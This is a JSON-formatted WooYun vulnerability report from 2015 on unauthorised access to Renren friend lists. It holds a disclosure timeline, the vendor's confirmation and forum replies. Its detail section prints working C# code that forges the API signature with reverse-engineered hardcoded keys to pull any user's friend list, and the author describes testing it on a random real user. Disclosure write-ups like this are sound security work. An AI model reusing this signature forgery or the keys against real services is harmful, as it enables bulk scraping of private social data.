{"id": 19977, "wybug_id": "wooyun-2015-0106709", "wybug_title": "破解人人API之未授权获得任意用户好友列表", "wybug_corp": "人人网", "wybug_author": "小手冰凉", "wybug_date": "2015-04-09 00:19", "wybug_open_date": "2015-07-08 13:56", "wybug_type": "非授权访问/认证绕过", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "安全"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-12：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-06-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-08：\t细节向公众公开  简要描述： 破解人人API之未授权获得任意用户好友列表 详细说明：  首先人人有公开的API，今天发现的这是公开的中间的一个，但是公开API是要申请才能使用的，这里发现的不需要任何申请，只需要你有人人账号就可以。登陆手机端人人，查看自己的好友的好友列表，抓包截取数据包\nurlhttp://api.m.renren.com/api字段如下api_keycall_idgzhasGenderhasNetworkmethodpagepage_sizsession_keyuserIdsig\n下面需要进行数据伪造，session_key是自己登陆后或的token，抓包就能看到，关键是字段sig，校验字段，这里利用之前提交的漏洞逆向出的校验计算算法，整个数据包产生过程如下\nstring api_key = \"8b281811f80c471c8d337f5434dd5708\";        string session_key = <自己的token>;        public string getFriends(string user_id)        {            string date = \"\";            date += \"api_key=\" + api_key;            date += \"&call_id=\" + inc.nowtime();            date += \"&gz=compression\";            date += \"&hasGender=1\";            date += \"&hasNetwork=1\";            date += \"&method=friends.getFriends\";            date += \"&page=1\";            date += \"&page_size=2000\";            date += \"&session_key=\" + session_key;            date += \"&userId=\" + user_id;            date += \"&v=1.0\";            string attach = \"931cd71b96bf45b150f0ab8591cd9273\";            date += \"&sig=\" + inc.gMD5(date.Replace(\"&\", \"\") + attach);            return (Post.HttpPostGzip(\"http://api.m.renren.com/api\", date, null));        }\n其中两个十六进制字符串都是逆向出的固定值这样就能获得任意用户的好友列表。危害涉及到信息泄露，批量爬去然后进行大数据分析等等。利用的时候写了一个小程序测试如下，随便找一个妹子：\n\n注意看她的id和好友个数\n\n   漏洞证明：  如上   修复方案：  校验算法，还有那两个固定字符串需要好好处理下   版权声明：转载请注明来源 小手冰凉@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2015-04-09 13:54 厂商回复： 非常感谢！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-04-09 10:07 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  求带！叼    \n     2015-04-09 12:02 |    \t\t大物期末不能挂 \t\t\t( 普通白帽子  |\t\t\t        Rank:132 漏洞数:23        | 1.一个学渣，只求每门都不挂2.想把漏洞提...)\t\t \n  求带！+1    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}